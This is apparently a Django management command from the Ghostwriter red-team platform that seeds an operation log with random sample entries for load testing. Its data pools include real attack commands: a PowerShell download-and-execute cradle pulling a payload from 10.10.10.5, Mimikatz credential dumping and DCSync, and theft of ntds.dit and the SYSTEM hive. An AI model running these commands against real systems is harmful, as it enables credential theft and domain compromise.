# Standard Libraries
import random
import time
from datetime import timedelta

# Django Imports
from django.core.management.base import BaseCommand, CommandError
from django.utils import timezone

# Ghostwriter Imports
from ghostwriter.oplog.models import Oplog, OplogEntry

# ---------------------------------------------------------------------------
# Semi-realistic sample data pools
# ---------------------------------------------------------------------------

OPERATORS = ["operator1", "operator2", "operator3", "red_team_lead", "admin"]

SOURCE_IPS = [
    "192.168.1.10",
    "192.168.1.42",
    "10.10.10.5",
    "172.16.0.20",
    "10.0.0.99",
]

DEST_IPS = [
    "10.10.10.100",
    "10.10.10.101",
    "192.168.50.1",
    "172.31.0.5",
    "10.0.0.1",
    "dc01.corp.local",
    "fileserver.corp.local",
    "webserver.corp.local",
]

TOOLS = [
    "Poseidon",
    "Apollo",
    "Mimikatz",
    "nmap",
    "PowerView",
    "Rubeus",
    "Certify",
    "SharpHound",
]

USERS = [
    r"CORP\Administrator",
    r"CORP\svc_backup",
    r"NT AUTHORITY\SYSTEM",
    r"CORP\\jfrank",
    r"CORP\\dmcquire",
    "root",
    "www-data",
]

COMMANDS = [
    "net user /domain",
    "whoami /all",
    "ipconfig /all",
    "nltest /dclist:corp.local",
    "sekurlsa::logonpasswords",
    "lsadump::dcsync /domain:corp.local /user:krbtgt",
    "Invoke-BloodHound -CollectionMethod All",
    'shell powershell -nop -exec bypass -c "IEX(New-Object Net.WebClient).DownloadString(\'http://10.10.10.5/payload.ps1\')"',
    "execute-assembly /tools/Rubeus.exe asktgt /user:admin /password:P@ssw0rd",
    "portscan 10.10.10.0/24 1-1024",
    'shell net use \\\\dc01\\C$ /user:CORP\\Administrator "P@ssw0rd"',
    "hashdump",
    "ls /etc/passwd",
    "ps",
    "getuid",
    "shell cmd /c set",
    "upload /tools/winpeas.exe C:\\Windows\\Temp\\winpeas.exe",
    "download C:\\Windows\\NTDS\\ntds.dit",
    "shell reg save HKLM\\SYSTEM C:\\Windows\\Temp\\system.hive",
    "certify find /vulnerable",
]

DESCRIPTIONS = [
    "Enumerated domain users to identify privileged accounts.",
    "Checked current user privileges and group memberships.",
    "Gathered network configuration for lateral movement planning.",
    "Listed domain controllers in the target domain.",
    "Dumped credentials from LSASS memory.",
    "Performed DCSync to extract krbtgt hash for golden ticket.",
    "Collected AD object data for BloodHound analysis.",
    "Executed in-memory payload to establish persistence.",
    "Requested Kerberos TGT for credential testing.",
    "Scanned internal subnet for open services.",
    "Mounted administrative share for file staging.",
    "Dumped hashes from SAM database.",
    "Listed local passwd entries for account enumeration.",
    "Reviewed running processes for AV/EDR presence.",
    "Confirmed current user context post-escalation.",
    "Enumerated environment variables for credential hunting.",
    "Uploaded privilege escalation tool for local execution.",
    "Exfiltrated NTDS.dit for offline cracking.",
    "Backed up SYSTEM hive to extract boot key.",
    "Identified misconfigured certificate templates.",
]

TAGS = [
    "att&ck:T1059",
    "att&ck:T1003",
    "att&ck:T1021",
    "att&ck:T1078",
    "att&ck:T1047",
    "att&ck:T1558",
    "att&ck:T1482",
    "att&ck:T1083",
    "objective:reconnaissance",
    "creds",
    "vulnerability",
    "detection",
    "privesc",
    "lateral-movement",
    "discovery",
    "persistence",
    "exfiltration",
    "initial-access",
]


def make_entry(oplog, base_time, index):
    """Build (but do not save) a single OplogEntry."""
    start = base_time - timedelta(minutes=random.randint(0, 5))
    end = start + timedelta(seconds=random.randint(10, 300))

    return OplogEntry(
        oplog_id=oplog,
        start_date=start,
        end_date=end,
        source_ip=random.choice(SOURCE_IPS),
        dest_ip=random.choice(DEST_IPS),
        tool=random.choice(TOOLS),
        user_context=random.choice(USERS),
        operator_name=random.choice(OPERATORS),
        command=random.choice(COMMANDS),
        description=random.choice(DESCRIPTIONS),
        output=f"[Entry #{index}] Command completed successfully." if random.random() > 0.3 else "",
        comments="",
    )


class Command(BaseCommand):
    help = "Populate an Oplog with generated sample entries for load/scroll testing."

    def add_arguments(self, parser):
        parser.add_argument("oplog_id", type=int, help="ID of the target Oplog")
        parser.add_argument(
            "--count",
            type=int,
            default=250,
            help="Number of entries to create (default: 250)",
        )
        parser.add_argument(
            "--delete",
            action="store_true",
            help="Delete all existing entries before inserting",
        )

    def handle(self, *args, **options):
        oplog_id = options["oplog_id"]
        count = options["count"]
        delete_first = options["delete"]

        try:
            oplog = Oplog.objects.get(pk=oplog_id)
        except Oplog.DoesNotExist as exc:
            raise CommandError(f"No Oplog found with ID {oplog_id}.") from exc

        self.stdout.write(f"Target: Oplog #{oplog.pk} — '{oplog.name}'")

        if delete_first:
            deleted, _ = OplogEntry.objects.filter(oplog_id=oplog).delete()
            self.stdout.write(self.style.WARNING(f"  Deleted {deleted} existing entries."))

        # Spread entries backwards in time from now, ~5 minutes apart
        base_time = timezone.now()
        for i in range(1, count + 1):
            base_time -= timedelta(minutes=random.randint(3, 8))
            entry = make_entry(oplog, base_time, i)
            entry.save()
            # Assign 1-3 random tags to the entry
            num_tags = random.randint(0, 3)
            selected_tags = random.sample(TAGS, num_tags)
            entry.tags.add(*selected_tags)
            # Small delay between creations enables sorting by timestamp
            time.sleep(0.01)

        self.stdout.write(
            self.style.SUCCESS(f"  Created {count} entries. Done.")
        )
